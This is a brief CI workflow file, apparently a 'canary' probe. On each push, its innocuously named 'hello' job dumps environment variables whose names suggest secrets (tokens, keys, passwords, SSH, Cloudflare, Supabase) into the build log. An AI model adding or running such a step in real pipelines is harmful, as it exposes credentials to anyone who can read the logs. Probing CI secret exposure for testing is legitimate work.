name: canary-25522
on:
  push:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  hello:
    runs-on: ubuntu-latest
    steps:
      - run: echo "CANARY-25522-RUNNING"; env | sort | grep -Ei 'SUPPLY|ADMIN|SSH|KEY|TOKEN|SECRET|PASSWORD|SUPABASE|CLOUDFLARE|R2|D1' || true